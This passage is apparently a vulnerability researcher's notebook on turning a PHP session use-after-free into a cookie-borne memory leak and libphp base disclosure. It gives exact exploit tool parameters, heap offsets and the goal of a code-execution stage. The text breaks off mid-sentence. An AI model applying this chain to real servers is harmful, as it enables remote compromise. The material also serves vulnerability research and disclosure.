# B1 gate: the stale id is reachable in the next request's pre-RINIT window

> **Reading note.** This is the lab notebook from the day the disclosure was worked out, kept in the
> order it happened — including the claims that were later retracted. It references instruments that
> stayed out of this repository (they answered questions that are already answered here), so a `gdb/…` or
> `poc/…` name that is not in this repository means "used during the work", not "missing file".
> Everything needed to reproduce the result is shipped; see `docs/POC_CHAIN.md`.

Prerequisite for any leak stage: after A1, does a *later* request still see the stale `PS(id)` long
enough to use it? Measured with `gdb/psid_a1_window.gdb` (prints `PS(id)` at every
`php_request_startup` and every `php_session_rfc1867_callback`), one A1 then one consumer request.

## Result

```
=== A1 (--progress-first)     200 OK 915 B  oom=True  (no Set-Cookie: id adopted)
=== B1 (multipart, no cookie) 200 OK 195 B  (no Set-Cookie) body "OK"

[pw] next request startup   PS(id)=0x7fff672540c0 id=<32 bytes, decoded below>
[pw] rfc1867 callback       PS(id)=0x7fff672540c0 id=<same pointer>   (1771 callbacks)
[pw] rfc1867 callback       PS(id)=NULL                              (5, early in A1)
```

1771 callback events carried the **stale pointer**, and the 8 bytes read through it are visibly a
session id with every other byte overwritten:

* A1's id was `39e384629c312f4e11882d4ed10f4061`;
* what the pointer reads now is `39 e3 84 62 9c 31 2f 4e 11 88 2d 4e D1 0f 40 61` — the same 32
  hex characters with the **odd bytes replaced** by whatever the allocator put there afterwards.

That is the disclosure substrate in its raw form: the pointer is live, the memory behind it is
recycled, and the engine reads it during the next request's startup.

## Why B1 as sent did not produce a cookie

`php_session_rfc1867_callback` only initialises a session when the progress field *and* an id are
available from the request itself; with no `PHPSESSID` field and no cookie it leaves the stale
`PS(id)` alone and no `send_cookie` happens. That is a property of the consumer shape, not of the
substrate — the substrate was present at every callback entry.

So the next B1 iteration has to carry a `PHPSESSID` field (a valid but different id) so the callback
adopts it and runs `php_session_send_cookie`, which URL-encodes the id it is holding. The question
that iteration answers is which id the encode actually walks: the one just adopted, or the stale
pointer the globals still hold.

## Iteration 2: a consumer that does start a session — and why it still does not leak

`poc/b1_probe.py --sid-field <32-hex>` sends `PHPSESSID` as a multipart field, which is what makes
the callback initialise a session and run `send_cookie`. Measured after the same A1:

| consumer | response | `Set-Cookie` | leak? |
|---|---|---|---|
| no field, no cookie | 200, 195 B | none | no session at all |
| `PHPSESSID` field = `0123…cdef` | 200, 259 B | `e2f54e1e…` (generated, 32 hex) | **no** |
| cookie = `0123…cdef` | 200, 259 B | `65e6883e…` (generated, 32 hex) | **no** |

In both cases PHP **replaced** the id with a fresh one and announced it, and `PS(id)` was `NULL`
afterwards. So the stale pointer is not what the encode walks — the consumer's own
`php_session_initialize` resets the id before `send_cookie` runs.

That rules out the simple reading of B1 ("consumer keeps the stale id and encodes it") and matches
why the reference shape is so elaborate: its `LEAK_SPEC`
(`G:511:0x137` ×14 + `G:400:0x137` + `G:511:0x137` + `X:900`, `--fake-len 0xC8000`) exists to place
**forged `zend_string` objects** at a known page, so the id pointer references attacker-shaped
memory *by construction* rather than by inheriting a stale one.

Two things to settle before building that geometry:

1. **Adoption is not deterministic across shapes.** Earlier: `PHPSESSID` field + 1 file part
   adopted; + 19 file parts did not; here field + 1 file part + progress did not. Until this is
   pinned to a rule, any B1 calibration rests on a coin flip.
2. **Which allocation the forged strings must land in.** The `0x137` page in the reference spec is a
   Zend MM page index inside the request heap; deriving it for our build is the calibration step
   that gdb is allowed to help with (final runs must not need it).

## Iteration 3: geometry calibrated, first forge attempt does not leak yet

`gdb/psid_raw.py` now also reports where the stale pointer sits inside its 2 MiB chunk. Measured
twice (two separate A1 runs), the number is stable:

```
PS(id) = 0x7fff672540c0
chunk_base = 0x7fff67200000   off = 0x540c0   page = 0x54
```

So unlike the reference calibration, **our id is not page-aligned**: it sits 0xc0 bytes into page
0x54. The reference hard-codes `A:0x137`, i.e. an id exactly at `chunk + 0x137000`; copying that
shape would put the forged header 0xc0 bytes away from the pointer and change nothing.

`poc/b1_forge.py` therefore takes the offset as a parameter and places the fake `zend_string`
header at `off - 0x1018` inside a full-chunk value (0x1018 = 0x1000 allocation header + 0x18 run
header, which is where a full-chunk value's data begins).

First attempt:

```
A1         -> 200 / 915 B, oom=True
off        = 0x540c0   hdr_off_in_value = 0x530a8   fake_len = 0xC8000
B1 (forge) -> 200 / 769 B,  no Set-Cookie,  PS(id)=NULL afterwards
```

`PS(id)` being NULL afterwards proves the consumer **did** act on the stale id (it consumed it),
but no cookie was produced. The 769-byte body (warnings) was not inspected in this run, and that is
where the next step starts: the reference's trick is that the forged string's first data byte is
`/` so `php_session_valid_key()` fails, and the *failure* path is what re-encodes the id into the
cookie. Either that path is not reached with our shape, or the forged header is not where we think
it is.

Two candidate causes, both cheap to separate:

1. **The value did not land in the same chunk.** A full-chunk fill only reuses the stale chunk if
   the allocator hands that chunk back; `--fields 3` sends three ~2 MB values, so the odds are good
   but not measured. `gdb/psid_raw.py` after the forge would show a *new* non-NULL pointer if the
   chunk had been reused but PS(id) had been overwritten with something else.
2. **The consumer resets the id before any encode.** In iteration 2 a session-starting consumer
   replaced the id and announced it; here nothing was announced at all, which is a third behaviour
   worth reading out of the body text.

## Iteration 4: the forge is NOT landing — and the iteration-3 claim is retracted

Iteration 3 read the warning

```
PHP Request Startup: Session ID is too long or contains illegal characters …
```

as proof that the engine had read the forged `zend_string`. That was wrong, and the control shows
it: with `--fake-len 0x20 --data-head aaaaaaaaaaaaaaaa` (a *valid* id of 32 characters) the
response is byte-for-byte the same warning, and with `--data-head /99BBBBB` too. Three different
forged headers cannot produce one identical message — so the message comes from the **stale
pointer's own garbage**, not from anything we placed.

Two consequences:

1. The rejection is the stale string being invalid, which happens **before** `send_cookie`; the
   encode never runs, so no cookie. That matches every run so far.
2. The forge itself has not been demonstrated yet. `gdb/find_forge.py` was written to answer "did
   the value land in the stale chunk", and its first run shows the measurement trap rather than the
   answer: with an `'a'×16` marker and `'A'`-filled fields there are **25 marker hits**, all in one
   unrelated chunk (`0x7fff68200000`, offset ~0x1036b) with garbage headers — the marker occurs
   inside the fills themselves.

So the next run needs (a) a **random** marker, not a repeated byte, and (b) the stale chunk recorded
*before* the consumer request (PS(id) is NULL afterwards, so it cannot be read later).

```bash
# correct sequence
A1 --progress-first            -> record chunk_base and off from gdb/psid_raw.py
b1_forge --off <off>           -> with a random 16-byte marker
gdb/find_forge.py FORGE_MARK=<same marker>   -> is any hit in the recorded chunk?
```

If the answer is "no hit in that chunk", the calibration problem is allocator steering, and the
reference's `F:501,F:501` prefix (two ~2 MB fills before the forged one) is the knob: it exists to
force Zend MM to hand the freed chunk back. Our current shape sends three 511-page fields and no
explicit cache-warming prefix.

## Iteration 5: random marker + cache prefix — the post-hoc scan cannot answer this

Shape: two 501-page `P` fills (cache warming), then the forged 511-page field, random 16-byte marker
at the fake data head, `--fake-len 0xC8000`.

```
recorded before the consumer:  chunk=0x7fff67200000  off=0x540c0
MARKER=c4b9b6c05ab3827a9efd80416d73b345
body=6305673 B  response 200 / 769 B  no Set-Cookie  (same warning as before)
find_forge after the request:  marker hits: 0
```

Zero hits is not the answer to "did it land" — it is a flaw in the method. The scan runs **after**
the request has finished, and Zend MM releases the request heap at shutdown, so the marker is gone
whether or not it ever sat in the stale chunk. The `'a'` hits seen in iteration 4 were leftovers in
a chunk that happened to survive, which is exactly the kind of false signal that made the earlier
reading wrong.

What the run does establish, from the request itself: with `fake_len 0x20` and a **valid**
32-character data head the `Session ID is too long or contains illegal characters` warning still
appears. If the forged header had landed at the pointer, that value would have passed validation.
So the forged value almost certainly does not reach the stale chunk — but "almost certainly" is
where this method stops.

**The instrument has to observe inside the request**, not after it:

- break at `php_session_initialize` (or `php_session_send_cookie`) and read `PS(id)` plus the chunk
  it belongs to;
- separately record which chunks the large fields actually occupy, e.g. by breaking on
  `_emalloc_large` when the size is 511 pages and printing the returned pointer;
- compare the two sets. That turns "did the fill reach the stale chunk" into a direct read instead
  of an inference from a warning string.

Until that exists, the allocator-steering hypothesis (and the `F:501` prefix idea borrowed from the
reference) is **untested**, not refuted.

## Iterations 6-10: the allocator measured, and what it says about the plan

The instruments from iteration 5 were built and run. They answer the placement question and, in
doing so, retire three assumptions this document was working from.

### Instrument set

| tool | what it reads | why it can be trusted |
|---|---|---|
| `gdb/b1_header_watch.gdb` | the `zend_string` header behind `PS(id)` at startup, at every `rfc1867` callback, at `php_session_initialize` | reads the engine's own pointer, no interpretation of response text |
| `gdb/b1_place_scan.gdb` | `PS(id)` at startup **and** every copy of a random marker at `php_request_shutdown` | both facts in one process, so chunk comparison is valid |
| `gdb/chunk_map.py` / `gdb/chunk_map_at.gdb` | `free_pages`, `free_map`, `page_info[]` of the chunk holding `PS(id)` | the bitmap offset is found by matching popcount against `512 - free_pages`, not hard-coded |
| `poc/placement_summary.py` | per-chunk page ranges from a scan log | turns ~400 marker hits into a fill pattern |

### Corrected facts

1. **A large allocation's data starts on the page boundary.** `zend_mm_alloc_pages` ends with
   `return ZEND_MM_PAGE_ADDR(chunk, page_num)`. `b1_forge.py` used `VALUE_DATA = 0x1018`, which put
   every forged header 0x18 bytes too low. Fixed to `0x1000`.
2. **`511 * 4096 - 25` is over the large limit.** A multipart value becomes a `zend_string`, so 24
   header bytes + 1 NUL are added: 2093076 > `ZEND_MM_MAX_LARGE_SIZE` (0x1FF000). Every "full-chunk"
   value sent so far was therefore a **huge** allocation, which always gets a fresh chunk at a new
   address. The value length is now `pages * 4096 - 50`.
3. **`PS(id)` is not adopted from the multipart field at the moment assumed.** At
   `php_request_startup` of an A1 request the pointer is already `0x7fff672540c0` with a **valid**
   header (`refcount=1 type=0x16 len=0x10`), and it is that same address in *every* run, for body
   sizes from 0.75 MiB to 3.8 MiB, with `--big-first` from 0 to 320 and `--parts-first` from 0 to 60.
   The string is allocated at request start and its address does not follow the body at all.

### The chunk, measured

```
[cma] first-part PS(id)=0x7fff672540c0 chunk=0x7fff67200000 page=0x54 free_pages=415
      pages 0x000-0x001 LRUN 2 pages (8 KiB)
      pages 0x002-0x007 SRUN bin=10 (6 pages)
      pages 0x008-0x023 LRUN 28 pages (112 KiB)
      pages 0x024-0x1ff free
```

`chunk_map.py` after A1: `free_pages=511 free_tail=1 num=0` — the chunk is **`heap->main_chunk`**,
fully free. `zend_mm_shutdown` keeps `main_chunk` in the list and pushes only the *other* chunks into
`cached_chunks`, and a cached chunk comes back from `zend_mm_chunk_init` with `free_tail = 1`,
`free_pages = 511`. So a chunk that is not the main one is re-initialised to "empty from page 1",
which is the geometry the reference relies on — the main chunk is not.

Where our values actually go, per chunk, from the marker scan (`b1_forge --values 1`):

```
0x7fff57200000  values=511  pages 0x1..0x1ff     <- a fresh chunk, filled completely
0x7fff57400000  values=511  pages 0x1..0x1ff     <- a copy from a later growth step
0x7fff57a00000  values=511  pages 0x1..0x1ff
0x7fff67200000  values=405  pages 0x5e..0x1fe    <- main chunk, never below page 0x5e
stale pointer: chunk 0x7fff67200000 page 0x54
```

A one-page spray behaves the same way: the lowest page reached in the main chunk is 0x5e, while
`PS(id)` is at 0x54 — ten pages lower, inside the band the request itself consumes before the first
value of the body exists. Framing makes no difference (Content-Length and chunked measure
identically), so the low pages are not dechunk buffering.

### What the header behind the pointer really is

```
startup      PS(id)=0x7fff672540c0 refcount=1         type=0x16 len=0x10   <- a live id string
rfc1867#1    PS(id)=0x7fff672540c0 refcount=1730494704 type=0x7fff len=0x10  <- freed slot
bytes at 0x7fff672540c0:  f0 3c 25 67 ff 7f 00 00 | 10 00 ... | <16-byte id>
```

`refcount=1730494704` is `0x67253cf0` — a heap pointer, i.e. `zend_mm_free_small` wrote
`free_slot->next_free_slot` into the first 8 bytes of the slot. The `len` field and the id data are
untouched, which is why `PS(id)` still "reads" as a 16-byte string. So during the request the pointer
addresses a **freed 48-byte bin slot**, and that slot is on the free list — the next allocation of
that bin reuses it.

### Consequences for the plan

- Any future attempt has to place a forged header in a **freed 48-byte bin slot at a fixed address**,
  or move the id string into a **non-main** chunk. Sending bigger values does neither, which is why
  iterations 6-10 all produced `forged hits: 0`.
- `--progress-first` is confirmed necessary for `PS(id)` to survive A1, and the earlier
  "4 requests / 153 forms" style claims about counters do not apply to this stage.
- The `b1_spray.py` phase is right for a value that starts on a page boundary (content offset `0xa8`
  puts the header at `page + 0xc0`), so the spray tool is retained; only its reach is short.

## Iterations 11-13: aiming at the freed slot

With the pointer established as a freed 48-byte bin slot, three ways of putting a forged
`zend_string` header into that slot were tried. All three miss; the reasons are worth keeping.

| attempt | mechanism | result |
|---|---|---|
| `--values N` full-chunk fills | 511-page large value fills a whole chunk | fills fresh chunks from page 1; the main chunk is only reached from page 0x5e |
| `--slot48 60/200` parts | 48-byte values aimed at the bin slot | 0 hits; a 48-byte *value* becomes a 73-byte `zend_string` (24 header + value + NUL), i.e. a different bin |
| `--name-forge` | `substring_conf()` does `emalloc(len + 1)` on the `name=` parameter: raw bytes, 47  — 48-byte allocation, evaluated in the same callback that starts the session | request collapses to 192 B — a `NUL` inside the header line truncates it in the C-string parser, so the part is never completed |

The `name=` route is otherwise exactly right in shape (raw allocation of a size we choose, in the
right callback, immediately before `PS(id)` is read), so any future attempt along those lines has to
carry a header that is *also* a legal header-line string. A `zend_string` header contains at least
one NUL in `type_info`, so the parameter channel cannot carry it verbatim — the bytes would have to be
produced by something that decodes text into binary (e.g. a serializer, or a value that PHP stores
raw rather than a parameter string).

## Iterations 14-16: the two levers asked for ” binary channel and placement

### (a) Binary-safe channels, from the session source

`ext/session/session.c::php_session_rfc1867_callback` gives an exact map of what our bytes become.
Three channels carry **arbitrary binary of a length we choose**, with no `php_session_valid_key`
filter on the way:

| channel | code | lifetime |
|---|---|---|
| part value | `ZVAL_STRINGL(&progress->sid, value, value_len)` for the field named `session.name` | until `MULTIPART_EVENT_END` |
| progress key | `smart_str_appendl(&progress->key, *data->value, value_len)` (prefixed `upload_progress_`) | until `MULTIPART_EVENT_END` |
| `PS(id)` | `PS(id) = zend_string_init(Z_STRVAL(progress->sid), Z_STRLEN(progress->sid), 0)` at the first `MULTIPART_EVENT_FILE_START` | until freed by `php_rinit_session`/`php_session_reset_id` |

Two consequences that change the plan:

- `PS(id)` is **assigned from our field** in this path, so it is always fresh there (`PS(send_cookie)`
  is also set to `0`), and a forged header cannot be consumed by the rfc1867 path itself.
- The only call that encodes a possibly-dangling id is `php_session_reset_id()` →
  `php_session_send_cookie()` → `php_url_encode()`, i.e. the sequence the reference records as its
  OOM site (`php_url_encode` ← `php_session_reset_id` ← `php_session_initialize`). That call happens
  *after* the request heap has been shaped by the body, so the forged header has to be in the freed
  string's memory by then.

Also measured and rejected: `substring_conf()` does give a raw `emalloc(len + 1)` of the
`name=`/`filename=` parameter (a 47-byte name is a 48-byte allocation), but a `zend_string` header
contains NULs and a NUL truncates the header line ” the request collapses from 7.5 KB to 192 B.

### (b) Placement, measured

- After A1 the stale chunk has 511 free pages; at the first callback of B pages 1..0x23 are in use.
- A spray of 1-page values **does start at page 0x24** and walks upward (measured at callback #20:
  six 1-page runs at 0x24-0x29), but the parser's own buffers interleave as 20- and 24-page runs
  (0x2b-0x3e, 0x40-0x57) and swallow page 0x54.
- Forging inside the body stream (headers at absolute offsets ≡ 0xc0 mod 0x1000, and at the two
  value-buffer alignments 0xc0 / 0xa8) never came within 64 KiB of `PS(id)`: the strict scan (length
  **and** a random per-run data head) reports 0 hits, while a fixed data head produced a false hit at
  a constant address ” a stamp left over from a previous run, because the heap keeps old bytes.
- The reference's own record is `PS(id) = chunk + 0x137000`, i.e. page 0x137, inside the band a value
  can cover. Ours is page 0x54 in every shape tried: 0.75-3.8 MiB bodies, `--big-first` 0-320,
  `--parts-first` 0-60, cookie load, query parameters, chapter-and-verse.
- Its amplifier does not arm here either: `php2shell_aslr_stock.py` against our pinned
  `php:8.4.26-apache` returns 200/259 B with `Set-Cookie` and **no** OOM (`--n 427000`), so duplicated
  part headers do not accumulate heap on this build. That shape is not a route to the reference's
  `0x137000`.

**Where that leaves B1**: the target page is known to the byte (`0x540c0`) and the binary channel is
known; what is missing is one allocation of ours that covers that page while the body is parsed.
Measured attempts put the frontier at page 0x5e for value allocations and further away for body-text
stamping.

## Iteration 17: the target is a small-bin page, not a large run

`page_info[]` at the first callback of a body-forge request, decoded per bin (consecutive pages of
*different* bins look identical in this encoding, so they must not be merged):

```
pages 0x000-0x000 LRUN 1 page
pages 0x001-0x010 LRUN 16 pages (64 KiB)
pages 0x011-0x050 LRUN 64 pages (256 KiB)
pages 0x051-0x052 LRUN 2 pages (8 KiB)
pages 0x053-0x053 SRUN bin=10 (1 page)
pages 0x054-0x054 SRUN bin=5  (1 page)   <- PS(id) lives here
pages 0x055-0x055 SRUN bin=3  (1 page)
pages 0x056-0x056 SRUN bin=4  (1 page)
pages 0x057-0x057 SRUN bin=6  (1 page)
pages 0x058-0x058 SRUN bin=28 (1 page)
pages 0x059-0x074 LRUN 28 pages
```

`ZEND_MM_BINS_INFO` gives bin 5 = **48-byte slots, 85 per page**, and `0x540c0 / 0x30 = 4`, i.e. the
stale pointer is the **4th 48-byte slot of the bin-5 page at 0x54000** — a real slot boundary (41
bytes of `zend_string` for a 16-byte id falls in exactly this bin).

This closes the placement question and retires the whole family of attempts that came before it:

- a **large run can never cover a small-bin page**, so no full-chunk value, no `--fill-pages` variant,
  no body-stream stamping and no parser buffer can ever put a byte at `PS(id)`. The one run that
  showed `0x41414141` at the pointer was a heap-state fluke of that run, not a placement.
- the target has to be reached through **bin 5's free list**, i.e. by a 33-48 byte allocation that
  reuses that slot.

### What that implies for the binary channel

A bin-5 allocation is either a `zend_string` of at most 23 data bytes (24 header + 23 + NUL = 48) or a
raw 33-48-byte buffer. Only the raw buffer can carry a forged `len`, and the channels available in
`php_session_rfc1867_callback` are:

| channel | size class | binary safe |
|---|---|---|
| `substring_conf()` on `name=` / `filename=` | any, incl. 48 | **no** — a NUL truncates the header line, measured: the request collapses to 192 B |
| `progress->key` (`smart_str`) | min 128 (`SMART_STR_PREALLOC`) | yes |
| part value / `progress->sid` | any, but becomes a `zend_string` | yes (data at +0x18, header written by the engine) |

So the multipart parser cannot deliver a 48-byte raw binary allocation: the one binary-safe raw
buffer starts at 128 bytes, and the one 48-byte-capable raw path cannot carry the zero bytes a
`zend_size_t` length needs. That is a property of the parser, not of the allocator, and it is why
iterations 11-16 all failed in different ways.

**Next step it points to**: get the forged length written by something other than the multipart
parameter parser — either a `zend_string` whose header is corrupted by the bug itself (the OOM path
already leaves one dangling with `len` and data intact), or the session file/decode path where
`PS(mod_data)` is a binary buffer.

## Iteration 18: the encode site is reachable — and it proves why the forgery cannot work

`session.upload_progress.cleanup` is **On** in the stock ini, so `MULTIPART_EVENT_END` calls
`php_session_rfc1867_cleanup()` → `php_session_initialize()` → `php_session_reset_id()` →
`php_session_send_cookie()` → `php_url_encode(PS(id))`, i.e. an encode **inside the body phase**, which
is what the leak needs. Measured, one request with no file part:

```
B: PHPSESSID field + PHP_SESSION_UPLOAD_PROGRESS, no file part
   -> 200, 259 B, Set-Cookie: PHPSESSID=d9a06c8e372906772593a10992c93a06   (32 hex, generated)
B: same with one file part
   -> 200, 195 B, no Set-Cookie        (FILE_START sets PS(send_cookie) = 0)
```

So the cookie path fires exactly where we need it. Why it cannot leak, in one line each:

- `php_session_initialize()` validates `PS(id)` with `php_session_valid_key()` **before** the encode,
  and `PS_MAX_SID_LENGTH` is **256** — a forged `len` above 256 is rejected and the id is regenerated
  (that is the generated 32-hex cookie above).
- `PS(id)` is only *assigned* from our field in the `MULTIPART_EVENT_FILE_START` branch, and that is
  the same branch that sets `PS(send_cookie) = 0`. So the two things the leak needs — an id of our
  bytes, and an enabled cookie encode — are mutually exclusive in this path.
- `MULTIPART_EVENT_FORMDATA` forwards `new_val_len` from the input filter, which is the identity, so
  there is no way to make `ZVAL_STRINGL` copy more than we sent.

Together with iteration 17 (the pointer lives in a 48-byte bin page, so no large allocation can reach
it) this closes the pure-HTTP heap-gymnastics route: every path either gives us the bytes without the
encode, or the encode without our bytes.

**What is left is not placement but corruption**: `PS(id)` must point at a header whose `len` is large,
and with all consistent channels that header is written by the engine. The reference's own recorded
state — `PS(id) = chunk + 0x137000`, i.e. page 0x137 of a 2 MiB chunk, far outside any bin page for a
25-byte id — is only reachable if the pointer or the header was corrupted by the OOM itself, which is
the bug's own primitive rather than a heap-shaping trick.

## Iteration 19: the leak reproduces — chain closed with our own tools

Three ingredients were missing, each found by comparing with the reference lab rather than by guessing:

1. **An active `php.ini-production`.** The official image ships the file but does not activate it. Without
   it the arming request OOMs at `tried to allocate 12288` inside the session *decode*; with it the OOM
   lands at `tried to allocate 4096` and the child ends with `zend_mm_heap corrupted` - the state the
   chain needs.
2. **Five query parameters with eight-character names** (`?q0000000=v&...`). They are parsed before
   `_POST`, so they shift the bin-40/bin-64 free-list heads; with them `PS(id)` lands exactly on
   `page 0x137, offset 0x0` of the stale chunk, `free_pages = 0`, which is the reference's recorded
   geometry.
3. **The forged value must *end* at the fake data head.** A large value's data starts at
   `chunk + 0x1018` (it is a `zend_string`), so a fake header at `chunk 0x137000` sits at value offset
   `0x136fe8`. Making the value exactly `0x136009` bytes - header + 9-byte data head, nothing more -
   means the claimed `len` reads the *next allocation* instead of our own filler. This is why every
   earlier attempt leaked our own 'A' bytes: the value was a full 311 pages and the fake sat in the middle
   of it.

Also: the progress field goes **before** the fills, and the body is sent chunked (30 MB > `post_max_size`).

Measured, on `php:8.4.26-apache` (digest-pinned), one worker, `php.ini-production`, fresh container per
run:

```
A: poc/a1_arm.py --sid-hex 00 --big 78 --query-n 5 --query-len 1
   -> HTTP/1.0 500, 211 B, "tried to allocate 4096", zend_mm_heap corrupted
   -> PS(id) = chunk + 0x137000 (page 0x137, +0x0), free_pages = 0

B: poc/b1_forge.py --off 0x136fe8 --value-len 0x136009 --values 24 --fill-pages 311 \
                   --hdr-stride 0 --tail-vars 0 --fake-len 0x2000 --data-head /00BBBBBB \
                   --chunked --progress-first
   -> HTTP/1.1 200, Set-Cookie 14 497-14 562 chars, 8192 bytes decoded,
      62 pointers in one chunk cluster (different chunk per run: 0x7fff406/0x7fff496/0x7fff748)
```

With `--fake-len 0xC8000` the same two requests return **819 200 decoded bytes** with **11 825 pointers**
in one cluster plus 119 in a second — the wide disclosure window the execution stage needs.

Evidence (raw responses and decoded blobs) is kept on the measurement host under
`~/leak-evidence/`; the tools that matter are `poc/a1_arm.py` and `poc/b1_forge.py`, both ours.

**What is still open**: this is the leak (B1). Reading `zval_ptr_dtor`/`zif_system` out of the blob and
turning it into the A2/B2 execution stage is the next gate; the alignment scan for a symbol-plus-tag
qword class is `poc/decode_leak_cookie.py`'s job and it has not been pointed at these blobs yet.

## Iteration 20: the leak works, the module base does not (yet)

The disclosure itself is closed (iteration 19). What the execution stage needs next is the **libphp
load base**, and that is where the window falls short. Measured with `gdb/chunk_libphp_scan.gdb`,
which reads libphp's real range from `/proc/<pid>/maps` instead of guessing at low bits:

```
libphp = 0x7fff34790000-0x7fff35a6c000
chunk  = 0x7fff36200000   PS(id) = chunk + 0x137000
libphp pointers in the whole 2 MiB chunk: 2
  +0x136fc0 -> libphp+0x4d2fac
  +0x136fe0 -> libphp+0x4d2fe8
pointers below page 0x137 (out of reach): 2 ; at or above: 0
```

They are the interned keys of `progress->data`, allocated in `MULTIPART_EVENT_FILE_START` **just before**
`PS(id) = zend_string_init(...)` — the source order explains the address exactly, and it puts them 0x40
and 0x20 bytes *below* the pointer, i.e. outside a window that can only read forward.

Attempts to move them into the window, and what each measured:

| attempt | result |
|---|---|
| sweep the A fill (`--big` 76-79, `--burners` 19-22, `--parts`, `--fillers`, `--progress-len`) | only `--big 78 --burners 20` arms at all; the page stays 0x137 |
| query shapes 0-8 params, value 1/48/74 bytes | `PS(id)` page does not move at all |
| `--tail-files` (file parts after the values, before progress) to put `$_FILES` arrays with interned keys in the window | up to 20 parts keep the leak, but the window content does not change; above `max_file_uploads=20` the request dies |
| `--tail-vars 300/900` (the reference's `X:` filler) | identical window, 62 distinct pointers, no repeats |
| `--fake-len` 0x200000 / 0x400000 to read past the chunk into neighbouring mmaps | reads cleanly (no fault), 2 MiB and 4 MiB decoded, but the low-12 histogram is flat and no page-aligned base gathers two votes |

The reference's `parse_leak` assumes the **dominant** qword in the window is `zval_ptr_dtor`; our window
has no dominant qword at all (62 distinct values, one each). So their window covers a region of
`HashTable` headers, ours covers one bucket array of pointers to strings.

**Next step it points to**: an allocation *after* `PS(id)` whose payload contains module pointers. The
natural candidate is `progress->current_file`/`progress->files` (interned keys, created after the id in
the same `FILE_START` block), but that branch also sets `PS(send_cookie) = 0`, so it cannot coexist with
the cleanup encode that produces the cookie. Either another session structure carries module pointers
after the id, or `PS(id)` has to be moved below the existing 0x136 pair, which needs a different way to
shift the bin-64 head than the query string the reference used.

## Iteration 21: path 1 closed, path 2 measured

**Path 1 (move `PS(id)` to a lower page) is closed.** Classifying every shape by the allocation size in
the container log (the response hides it: `display_errors=Off`), because only one site is the target:

| `--big` | allocation that fails | `PS(id)` |
|---|---|---|
| 70-75 | none at all | - |
| 76-77 | 12288 (session decode) | NULL |
| **78** | **4096 (url_encode)** | **chunk+0x137000** |
| 79-82 | 4096 | NULL (session state not preserved) |

So 78/20 is a point, not a range, and the page is 0x137. The reference's row with `id page 0x007` is not
reachable from our configuration; the query string does not shift anything because `auto_globals_jit`
defers `$_GET` and `use_only_cookies=1` keeps `treat_data(PARSE_GET)` out of `early_find_sid`.

**Path 2 (a module pointer allocated after `PS(id)`) was implemented and measured.** `b1_forge.py` gained
`--vars-after-first N`: nested array fields inserted *between* the first forged value and the rest, so
their `HashTable`s (`pDestructor = zval_ptr_dtor`) would land in the pages the window covers instead of a
second 311-page fill. Results:

```
vars_after_first=900, fake_len=0xC8000 -> decoded 819200, bases with 2 votes each
                                          (0x...353000 / 0x...360000 / 0x...36d000, all zend_hash_find)
vars_after_first=900, fake_len=0x2000  -> identical 62-pointer window, no votes
same chunk scanned after that B        -> libphp pointers: 0, pages touched: 0
```

The direct scan is conclusive: the tail arrays do **not** land in the stale chunk, so the two-vote bases
are alignment coincidences, not a load address. Also worth recording: a window larger than 0xC8000 does
not help, because the encode allocates about three times the claimed length and the arming leaves no
headroom for it — 0xC8000 (the rest of the chunk) is the ceiling, which matches the reference's own
constant.

**Where this leaves the module base**: it has to come from a structure that the session itself allocates
*after* `PS(id)` inside the stale chunk. The one place that happens is the `FILE_START` block, and the
same block is what switches the cookie off — unless the session status is taken back to `none` first, in
which case `php_session_initialize()` re-enables `send_cookie` on the next call (line 1669 of
`session.c`). That combination — file part to get `PS(id)` replaced *and* status reset, then the cleanup
initialise that re-enables the cookie — has not been measured yet and is the next experiment.

## What is settled, and what is not

| question | answer |
|---|---|
| does A1 leave a non-NULL `PS(id)`? | **yes** (`--progress-first`) |
| does the memory behind it read as recycled data? | **yes** — half-overwritten hex id |
| does it survive into the next request? | **yes, through `php_request_startup`** |
| is it visible at every rfc1867 callback of that request? | **yes**, 1771/1776 events |
| does a cookie-less consumer leak it? | **no** — no session init, no `send_cookie` |
| does a consumer with a `PHPSESSID` field leak it? | **no** — the slot is freed, then the id is replaced |
| is the cookie encode reachable inside the body phase? | **yes** — cleanup path (`session.upload_progress.cleanup=On`), measured `Set-Cookie` |
| can that encode see a forged `len`? | **no** — `php_session_valid_key` runs first and `PS_MAX_SID_LENGTH` is 256 |
| can a file part give us the id bytes? | **yes**, but the same branch sets `PS(send_cookie) = 0` |
| does the chain reproduce? | **yes** — A (ini + 5×8-char query) then B; 3/3 fresh containers, 8192 B leaked, 62 chunk pointers |
| does the wide window reproduce? | **yes** — `--spec "G:511:0x137*14,G:400:0x137,X:900"`: 819 200 B decoded, matching the reference |
| does the leak disclose a module pointer? | **yes** — 876 copies of `zval_ptr_dtor` (`libphp+0x638120`) in the window |
| is the module base exact? | **yes** — cookie-derived base == gdb's base, 3/3 fresh containers |
| does the delta trick work instead? | **no** — `libphp - chunk` moves ±0x20000-quantised between runs (-6592/-6464/-6752/-6624 pages) |
| what breaks a naive decoder? | `php_url_encode` turns byte 0x20 into `+`, so `...8120` arrives as `...812b` |
| what unlocks it? | active `php.ini-production`, the query shift, and a forged value that *ends* at the fake head (`--value-len`) |
| where is the string? | **fixed**: `0x7fff672540c0`, main chunk page 0x54 + 0xc0 |
| does the address follow the body? | **no** — invariant over 0.75–3.8 MiB bodies and part reordering |
| do full-chunk values cover it? | **no** — they fill fresh chunks from page 1; the main chunk only from page 0x5e |

## Iteration 22: the module base comes out of the leak (G1 gate met)

Iteration 21 closed both cheap paths, so the remaining question was what the reference does differently.
The answer is in its own notes (§6.1 of `RESEARCH_PURE_128M.md`), and it is a geometry detail we never
had:

| part | pages | fake header | what it does |
|---|---|---|---|
| `G:511:0x137` ×14 | 511 | page 0x137 | fills whole chunks, walking the chunk list |
| `G:400:0x137` | 400 | page 0x137 | takes the stale chunk *and leaves pages 0x191-0x1ff free* |
| `G:511:0x137` | 511 | page 0x137 | can no longer fit there, so the hole survives |
| `X:900` | - | - | 900 nested POST arrays; their pages are carved from the hole |

The point is that the *third* part cannot take the stale chunk any more, so the last 111 pages stay free
and the nested arrays' `zend_hash` structures are carved out of them — inside the 800 KB window that
starts at `PS(id)+0x18`. Those are real `zend_array`s, so their `pDestructor` is `zval_ptr_dtor`.

Two reasons we kept missing it:

1. our working recipe used `--value-len 0x136009`, i.e. the value *ended* at the fake header, which fills
   the chunk up to 0x137 and frees nothing above it (`free_pages = 0` for the whole request);
2. `b1_forge.py` documented `VALUE_DATA = 0x1000`, while a large value's data really starts at
   `0x1018` — the constant was wrong but compensating, because `--off` is the *absolute* chunk offset and
   `header_offsets()` subtracts `VALUE_DATA`, so the two errors cancelled. The reference builder spells
